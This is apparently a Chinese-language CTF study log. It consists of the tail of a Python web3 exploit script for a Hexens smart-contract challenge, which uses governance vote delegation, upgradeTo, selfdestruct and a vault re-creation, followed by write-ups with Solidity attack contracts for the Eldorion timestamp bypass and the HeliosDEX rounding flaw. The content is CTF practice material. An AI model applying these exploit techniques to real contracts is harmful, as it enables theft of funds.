    _solc_version = "0.8.13"
    solcx.set_solc_version(_solc_version)
    # Contract ABIs
    challenge = w3.eth.contract(
        address=CHALLENGE_ADDRESS,
        abi=[
            {
                "inputs": [],
                "name": "claim",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "player", "type": "address"}
                ],
                "stateMutability": "nonpayable",
                "type": "constructor",
            },
            {
                "inputs": [],
                "name": "diamond",
                "outputs": [
                    {"internalType": "contract Diamond", "name": "", "type": "address"}
                ],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "DIAMONDS",
                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "HEXENS_COINS",
                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "hexensCoin",
                "outputs": [
                    {
                        "internalType": "contract HexensCoin",
                        "name": "",
                        "type": "address",
                    }
                ],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "isSolved",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "PLAYER",
                "outputs": [{"internalType": "address", "name": "", "type": "address"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "vault",
                "outputs": [
                    {"internalType": "contract Vault", "name": "", "type": "address"}
                ],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "vaultFactory",
                "outputs": [
                    {
                        "internalType": "contract VaultFactory",
                        "name": "",
                        "type": "address",
                    }
                ],
                "stateMutability": "view",
                "type": "function",
            },
        ],
    )

    # Get contract addresses
    hexens_coin_addr = challenge.functions.hexensCoin().call()
    vault_addr = challenge.functions.vault().call()
    vaultFactory_addr = challenge.functions.vaultFactory().call()

    print(f"HexensCoin address: {hexens_coin_addr}")
    print(f"Vault address: {vault_addr}")
    print(f"VaultFactory address: {vaultFactory_addr}")

    hexens_coin = w3.eth.contract(
        address=hexens_coin_addr,
        abi=[
            {
                "type": "function",
                "name": "delegate",
                "inputs": [
                    {"name": "delegatee", "type": "address", "internalType": "address"}
                ],
                "outputs": [],
                "stateMutability": "nonpayable",
            },
            {
                "type": "function",
                "name": "transfer",
                "inputs": [
                    {"name": "to", "type": "address", "internalType": "address"},
                    {"name": "amount", "type": "uint256", "internalType": "uint256"},
                ],
                "outputs": [{"name": "", "type": "bool", "internalType": "bool"}],
                "stateMutability": "nonpayable",
            },
            {
                "type": "function",
                "name": "balanceOf",
                "inputs": [
                    {"name": "account", "type": "address", "internalType": "address"}
                ],
                "outputs": [{"name": "", "type": "uint256", "internalType": "uint256"}],
                "stateMutability": "view",
            },
            {
                "type": "function",
                "name": "getCurrentVotes",
                "inputs": [
                    {"name": "account", "type": "address", "internalType": "address"}
                ],
                "outputs": [{"name": "", "type": "uint256", "internalType": "uint256"}],
                "stateMutability": "view",
            },
        ],
    )

    vault = w3.eth.contract(
        address=vault_addr,
        abi=[
            {
                "inputs": [{"internalType": "bytes", "name": "data", "type": "bytes"}],
                "name": "governanceCall",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function",
            },
        ],
    )

    diamond_addr = challenge.functions.diamond().call()
    print(f"Diamond address: {diamond_addr}")
    diamond_addr = challenge.functions.diamond().call()
    diamond = w3.eth.contract(
        address=diamond_addr,
        abi=[
            {
                "inputs": [
                    {
                        "internalType": "uint256",
                        "name": "totalSupply_",
                        "type": "uint256",
                    }
                ],
                "stateMutability": "nonpayable",
                "type": "constructor",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "owner", "type": "address"},
                    {"internalType": "address", "name": "spender", "type": "address"},
                    {"internalType": "uint256", "name": "value", "type": "uint256"},
                ],
                "name": "Approval",
                "type": "event",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "from", "type": "address"},
                    {"internalType": "address", "name": "to", "type": "address"},
                    {"internalType": "uint256", "name": "value", "type": "uint256"},
                ],
                "name": "Transfer",
                "type": "event",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "owner", "type": "address"},
                    {"internalType": "address", "name": "spender", "type": "address"},
                ],
                "name": "allowance",
                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "spender", "type": "address"},
                    {"internalType": "uint256", "name": "amount", "type": "uint256"},
                ],
                "name": "approve",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "account", "type": "address"}
                ],
                "name": "balanceOf",
                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "decimals",
                "outputs": [{"internalType": "uint8", "name": "", "type": "uint8"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "spender", "type": "address"},
                    {
                        "internalType": "uint256",
                        "name": "subtractedValue",
                        "type": "uint256",
                    },
                ],
                "name": "decreaseAllowance",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "spender", "type": "address"},
                    {
                        "internalType": "uint256",
                        "name": "addedValue",
                        "type": "uint256",
                    },
                ],
                "name": "increaseAllowance",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "name",
                "outputs": [{"internalType": "string", "name": "", "type": "string"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "symbol",
                "outputs": [{"internalType": "string", "name": "", "type": "string"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [],
                "name": "totalSupply",
                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "to", "type": "address"},
                    {"internalType": "uint256", "name": "amount", "type": "uint256"},
                ],
                "name": "transfer",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function",
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "from", "type": "address"},
                    {"internalType": "address", "name": "to", "type": "address"},
                    {"internalType": "uint256", "name": "amount", "type": "uint256"},
                ],
                "name": "transferFrom",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function",
            },
        ],
    )
    vaultFactory = w3.eth.contract(
        address=vaultFactory_addr,
        abi=[
            {
                "inputs": [
                    {"internalType": "bytes32", "name": "salt_", "type": "bytes32"}
                ],
                "name": "createVault",
                "outputs": [
                    {"internalType": "contract Vault", "name": "", "type": "address"}
                ],
                "stateMutability": "nonpayable",
                "type": "function",
            }
        ],
    )

    print(f"Diamond balance: {diamond.functions.balanceOf(vault_addr).call() = }")
    print("Transferring tokens to accounts...")
    accounts = [
        [Account.from_key(f"0x{hex(i)[2:]:0>64}"), f"0x{hex(i)[2:]:0>64}"]
        for i in range(1, 12)
    ]
    for i in accounts:
        transfer(i[0].address, 10000000000000000)
        print(f"Transferred 10^16 tokens to {i[0].address}")

    # 1. Claim initial tokens
    print("\nClaiming initial tokens...")
    send_transaction(
        challenge.functions.claim(), accounts[0][0], privKey=accounts[0][1]
    )
    balance = hexens_coin.functions.balanceOf(accounts[0][0].address).call()
    print(f"Balance of account 0: {balance}")

    # 2. attack
    print("\nAttacking...")
    if (
        int(hexens_coin.functions.getCurrentVotes(account.address).call())
        < 100000000000000000000000
    ):
        for i in range(10):
            send_transaction(
                hexens_coin.functions.delegate(account.address),
                accounts[i][0],
                privKey=accounts[i][1],
            )
            send_transaction(
                hexens_coin.functions.transfer(
                    accounts[i + 1][0].address, 10000000000000000000000
                ),
                accounts[i][0],
                privKey=accounts[i][1],
            )
            currentVote = hexens_coin.functions.getCurrentVotes(account.address).call()
            print(f"Current votes of account: {currentVote}")

    def deploy_contract(w3, x_abi, x_bin):
        construct_txn = (
            w3.eth.contract(abi=x_abi, bytecode=x_bin)
            .constructor(diamond_addr, hexens_coin_addr)
            .build_transaction(
                {
                    "from": account.address,
                    "nonce": w3.eth.get_transaction_count(account.address),
                }
            )
        )
        tx_create = w3.eth.account.sign_transaction(construct_txn, PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
        tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        print(f"Contract deployed at address: { tx_receipt.contractAddress }")

        return tx_receipt.contractAddress

    x_meta = solcx.compile_files(
        ["x.sol"], output_values=["abi", "bin"], solc_version=_solc_version
    )
    x_abi = x_meta["x.sol:X"]["abi"]
    x_bin = x_meta["x.sol:X"]["bin"]
    x_address = deploy_contract(w3, x_abi, x_bin)
    # x_address = "0xaDFF41E489b5517A26bb2AbF3bE6c960740D4E09"

    # x_instance = w3.eth.contract(address=x_address, abi=x_abi)
    dark_vault = w3.eth.contract(address=vault_addr, abi=x_abi)

    governance_call_function = "governanceCall(bytes)"
    burn_function_signature = "burn(address,uint256)"
    burn_function_signature
    upgradeTo_function_signature = "upgradeTo(address)"
    # Encode the "burn" function calldata
    amount = 31337
    burn_function_selector = w3.keccak(text=burn_function_signature)[
        :4
    ]  # First 4 bytes of the function selector
    encoded_token = w3.to_bytes(
        hexstr=w3.to_checksum_address(diamond_addr)[2:].zfill(64)
    )  # Address encoded to 32 bytes
    encoded_amount = amount.to_bytes(32, byteorder="big")  # Amount encoded to 32 bytes

    calldata = burn_function_selector + encoded_token + encoded_amount
    send_transaction(vault.functions.governanceCall(calldata), account)

    print(f"Diamond balance: {diamond.functions.balanceOf(vault_addr).call() = }")

    # Encode the "upgradeTo" function
    upgradeTo_function_selector = w3.keccak(text=upgradeTo_function_signature)[
        :4
    ]  # First 4 bytes of the function selector
    encoded_token = w3.to_bytes(
        hexstr=w3.to_checksum_address(x_address)[2:].zfill(64)
    )  # Address encoded to 32 bytes

    calldata = upgradeTo_function_selector + encoded_token
    send_transaction(vault.functions.governanceCall(calldata), account)
    # Selfdestruct the vault
    send_transaction(dark_vault.functions._selfdestruct(), account)

    # Create a new vault using vaultFactory
    salt_ = w3.solidity_keccak(
        ["string"],
        ["The tea in Nepal is very hot. But the coffee in Peru is much hotter."],
    )
    send_transaction(vaultFactory.functions.createVault(salt_), account)

    # Initialization, and we can gain ownership of the vault, no need to attack again
    send_transaction(
        dark_vault.functions.initialize(diamond_addr, hexens_coin_addr), account
    )
    # Upgrade to the dark vault again
    send_transaction(vault.functions.governanceCall(calldata), account)

    # Gain diamonds!
    send_transaction(dark_vault.functions.new_sender(), account)

if __name__ == "__main__":
    main()
```

# 2025-08-04

太久没学Web3了，今天作为打卡第一天，先稍微做点简单题热身一下吧

下面是来源于Cyber Apocalypse CTF 2025的签到题Eldorion：

```solidity
// Eldorion.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract Eldorion {
    uint256 public health = 300;
    uint256 public lastAttackTimestamp;
    uint256 private constant MAX_HEALTH = 300;
    
    event EldorionDefeated(address slayer);
    
    modifier eternalResilience() {
        if (block.timestamp > lastAttackTimestamp) {
            health = MAX_HEALTH;
            lastAttackTimestamp = block.timestamp;
        }
        _;
    }
    
    function attack(uint256 damage) external eternalResilience {
        require(damage <= 100, "Mortals cannot strike harder than 100");
        require(health >= damage, "Overkill is wasteful");
        health -= damage;
        
        if (health == 0) {
            emit EldorionDefeated(msg.sender);
        }
    }

    function isDefeated() external view returns (bool) {
        return health == 0;
    }
}

// Setup.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { Eldorion } from "./Eldorion.sol";

contract Setup {
    Eldorion public immutable TARGET;
    
    event DeployedTarget(address at);

    constructor() payable {
        TARGET = new Eldorion();
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return TARGET.isDefeated();
    }
}

```

由题意我们可以知道我们需要击败300血的Eldorion，但是每次攻击最多只能攻击100点血量，而且每次攻击会将上次攻击时间和本次攻击时间进行比对，如果本次攻击时间大于上次攻击时间则Eldorion会回满血

看起来这就是一个无底洞，但是我们可以轻松发现记录攻击时间使用的是`block.timestamp`，即区块生成时间，因此我们只需要让多次攻击处于同一区块内就可以绕过时间检测，同时需要注意不要Overkill，否则攻击会失败

```solidity
// attack.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IEldorion {
    function attack(uint256 damage) external;
    function isDefeated() external view returns (bool);
}

contract Attack{
    IEldorion public eldorion;
    constructor(address _eldorion){
        eldorion = IEldorion(_eldorion);
    }

    function attack() public{
        for(uint8 i=0; i<3; i++){
            eldorion.attack(100);
        }
        require(eldorion.isDefeated(), "Failed to solve the problem");
    }
}
```

部署后调用`attack()`即可完成本题

是不是有点太水了，那就接着再水一题吧，是同一个CTF的第2题HeliosDEX：

```solidity
// HeliosDEX.sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

/***
    __  __     ___            ____  _______  __
   / / / /__  / (_)___  _____/ __ \/ ____/ |/ /
  / /_/ / _ \/ / / __ \/ ___/ / / / __/  |   / 
 / __  /  __/ / / /_/ (__  ) /_/ / /___ /   |  
/_/ /_/\___/_/_/\____/____/_____/_____//_/|_|  
                                               
    Today's item listing:
    * Eldorion Fang (ELD): A shard of a Eldorion's fang, said to imbue the holder with courage and the strength of the ancient beast. A symbol of valor in battle.
    * Malakar Essence (MAL): A dark, viscous substance, pulsing with the corrupted power of Malakar. Use with extreme caution, as it whispers promises of forbidden strength. MAY CAUSE HALLUCINATIONS.
    * Helios Lumina Shards (HLS): Fragments of pure, solidified light, radiating the warmth and energy of Helios. These shards are key to powering Eldoria's invisible eye.
***/

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";

contract EldorionFang is ERC20 {
    constructor(uint256 initialSupply) ERC20("EldorionFang", "ELD") {
        _mint(msg.sender, initialSupply);
    }
}

contract MalakarEssence is ERC20 {
    constructor(uint256 initialSupply) ERC20("MalakarEssence", "MAL") {
        _mint(msg.sender, initialSupply);
    }
}

contract HeliosLuminaShards is ERC20 {
    constructor(uint256 initialSupply) ERC20("HeliosLuminaShards", "HLS") {
        _mint(msg.sender, initialSupply);
    }
}

contract HeliosDEX {
    EldorionFang public eldorionFang;
    MalakarEssence public malakarEssence;
    HeliosLuminaShards public heliosLuminaShards;

    uint256 public reserveELD;
    uint256 public reserveMAL;
    uint256 public reserveHLS;
    
    uint256 public immutable exchangeRatioELD = 2;
    uint256 public immutable exchangeRatioMAL = 4;
    uint256 public immutable exchangeRatioHLS = 10;

    uint256 public immutable feeBps = 25;

    mapping(address => bool) public hasRefunded;

    bool public _tradeLock = false;
    
    event HeliosBarter(address item, uint256 inAmount, uint256 outAmount);
    event HeliosRefund(address item, uint256 inAmount, uint256 ethOut);

    constructor(uint256 initialSupplies) payable {
        eldorionFang = new EldorionFang(initialSupplies);
        malakarEssence = new MalakarEssence(initialSupplies);
        heliosLuminaShards = new HeliosLuminaShards(initialSupplies);
        reserveELD = initialSupplies;
        reserveMAL = initialSupplies;
        reserveHLS = initialSupplies;
    }

    modifier underHeliosEye {
        require(msg.value > 0, "HeliosDEX: Helios sees your empty hand! Only true offerings are worthy of a HeliosBarter");
        _;
    }

    modifier heliosGuardedTrade() {
        require(_tradeLock != true, "HeliosDEX: Helios shields this trade! Another transaction is already underway. Patience, traveler");
        _tradeLock = true;
        _;
        _tradeLock = false;
    }

    function swapForELD() external payable underHeliosEye {
        uint256 grossELD = Math.mulDiv(msg.value, exchangeRatioELD, 1e18, Math.Rounding(0));
        uint256 fee = (grossELD * feeBps) / 10_000;
        uint256 netELD = grossELD - fee;

        require(netELD <= reserveELD, "HeliosDEX: Helios grieves that the ELD reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");

        reserveELD -= netELD;
        eldorionFang.transfer(msg.sender, netELD);

        emit HeliosBarter(address(eldorionFang), msg.value, netELD);
    }

    function swapForMAL() external payable underHeliosEye {
        uint256 grossMal = Math.mulDiv(msg.value, exchangeRatioMAL, 1e18, Math.Rounding(1));
        uint256 fee = (grossMal * feeBps) / 10_000;
        uint256 netMal = grossMal - fee;

        require(netMal <= reserveMAL, "HeliosDEX: Helios grieves that the MAL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");

        reserveMAL -= netMal;
        malakarEssence.transfer(msg.sender, netMal);

        emit HeliosBarter(address(malakarEssence), msg.value, netMal);
    }

    function swapForHLS() external payable underHeliosEye {
        uint256 grossHLS = Math.mulDiv(msg.value, exchangeRatioHLS, 1e18, Math.Rounding(3));
        uint256 fee = (grossHLS * feeBps) / 10_000;
        uint256 netHLS = grossHLS - fee;
        
        require(netHLS <= reserveHLS, "HeliosDEX: Helios grieves that the HSL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");
        

        reserveHLS -= netHLS;
        heliosLuminaShards.transfer(msg.sender, netHLS);

        emit HeliosBarter(address(heliosLuminaShards), msg.value, netHLS);
    }

    function oneTimeRefund(address item, uint256 amount) external heliosGuardedTrade {
        require(!hasRefunded[msg.sender], "HeliosDEX: refund already bestowed upon thee");
        require(amount > 0, "HeliosDEX: naught for naught is no trade. Offer substance, or be gone!");

        uint256 exchangeRatio;
        
        if (item == address(eldorionFang)) {
            exchangeRatio = exchangeRatioELD;
            require(eldorionFang.transferFrom(msg.sender, address(this), amount), "ELD transfer failed");
            reserveELD += amount;
        } else if (item == address(malakarEssence)) {
            exchangeRatio = exchangeRatioMAL;
            require(malakarEssence.transferFrom(msg.sender, address(this), amount), "MAL transfer failed");
            reserveMAL += amount;
        } else if (item == address(heliosLuminaShards)) {
            exchangeRatio = exchangeRatioHLS;
            require(heliosLuminaShards.transferFrom(msg.sender, address(this), amount), "HLS transfer failed");
            reserveHLS += amount;
        } else {
            revert("HeliosDEX: Helios descries forbidden offering");
        }

        uint256 grossEth = Math.mulDiv(amount, 1e18, exchangeRatio);

        uint256 fee = (grossEth * feeBps) / 10_000;
        uint256 netEth = grossEth - fee;

        hasRefunded[msg.sender] = true;
        payable(msg.sender).transfer(netEth);
        
        emit HeliosRefund(item, amount, netEth);
    }
}


// Setup.sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

import { HeliosDEX } from "./HeliosDEX.sol";

contract Setup {
    HeliosDEX public TARGET;
    address public player;
    
    event DeployedTarget(address at);

    constructor(address _player) payable {
        TARGET = new HeliosDEX{value: 1000 ether}(1000);
        player = _player;
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return player.balance >= 20 ether;
    }
}
```

> 由于比赛已经过了很久了，我也不知道自己手上有多少初始ETH，假定是0.1ETH吧，同时为了方便在Remix调试（我懒得自己搓一个Foundry script了），稍微降低一下Setup中的参数，最终根据实际情况预定是传入99 ether（考虑到gas费无法传入100 ether），初始参数同样设置为99，`isSolved`等比修改为2 ether

这题提供了一个能交换3种ERC20的DEX，每种代币都有其独特的汇率，最后的refund只能兑换1种代币，从合约来看自然是HLS汇率最好，能和ETH达到1:0.1的汇率；除此之外，兑换代币和refund的时候都会收取2.5‰的手续费

观察一下合约，refund被一个reentrancy guard修饰，且只有该函数能转出ETH，因此重入攻击打不了，所以想解题只能尽可能多兑换代币

观察三种代币的兑换方式，我们发现它们都使用了OZ的`mulDiv`函数，但是其参数中的`Math.Rounding`十分可疑，因此我们查看OZ的合约源码：

```solidity
library Math {
    enum Rounding {
        Floor, // Toward negative infinity
        Ceil, // Toward positive infinity
        Trunc, // Toward zero
        Expand // Away from zero
    }
    // ...
}
```

那么我们会发现兑换ELD，MAL，HLS时，计算得到的代币数量分别会向下取整，向上取整，向上取整（由于不可能兑换负数个代币），因此我们可以仅使用1 wei兑换1个MAL或者1个HLS；同时由于整数除法导致的精度损失，我们兑换代币的数量只要不到400，就能忽略手续费，因此我们可以编写如下的攻击合约：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IHeliosDEX{
    function swapForHLS() external payable;
    function oneTimeRefund(address item, uint256 amount) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Attack {
    IHeliosDEX public dex;
    constructor(address _dex) {
        dex = IHeliosDEX(_dex);
    }

    function attack(address item) public payable{
        uint iterations = msg.value;
        require(iterations > 80, "Too less iterations");
        for(uint i=0; i<iterations; i++){
            dex.swapForHLS{value: 1 wei}();
        }
        IERC20(item).approve(address(dex), iterations);
        dex.oneTimeRefund(item, iterations);
        refund();
        require(msg.sender.balance > 2 ether, "Failed to solve this problem");
    }

    function refund() internal{
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
```

> 需要注意一下，对于原题，使用for循环可能导致gas费消耗问题，可以稍微更改一下，此处仅作为思路提供
>
> 同时在最后进行refund前需要首先向DEX进行Approve操作，否则DEX的`transferFrom`会失败导致revert，同时由于转钱是转给`msg.sender`，因此需要给合约添加`receive()`函数接收转账，并添加提款函数提走合约内的资金以完成本题

行吧，就这样了，开摆~


# 2025.07.30


<!-- Content_END -->
